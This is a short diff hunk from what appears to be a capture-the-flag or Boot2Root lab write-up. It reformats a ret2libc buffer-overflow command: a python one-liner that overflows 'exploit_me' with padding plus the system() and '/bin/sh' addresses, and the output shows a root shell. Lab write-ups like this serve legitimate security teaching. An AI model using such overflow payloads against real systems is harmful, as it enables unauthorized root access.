@@ -1426,8 +1426,7 @@ print PAYLOAD
 ### Executing the exploit
 
 ```sh
-zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct;BIN_SH_ADDR = 0xb7f8cc58;SYSTEM_ADDR = 0xb7e6b060;PAYLOAD = "A" * 140 + struct
-.pack("<I", SYSTEM_ADDR) +"AAAA" + struct.pack("<I", BIN_SH_ADDR);print PAYLOAD')
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct;BIN_SH_ADDR = 0xb7f8cc58;SYSTEM_ADDR = 0xb7e6b060;PAYLOAD = "A" * 140 + struct.pack("<I", SYSTEM_ADDR) +"AAAA" + struct.pack("<I", BIN_SH_ADDR);print PAYLOAD')
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���
 # 
 # id
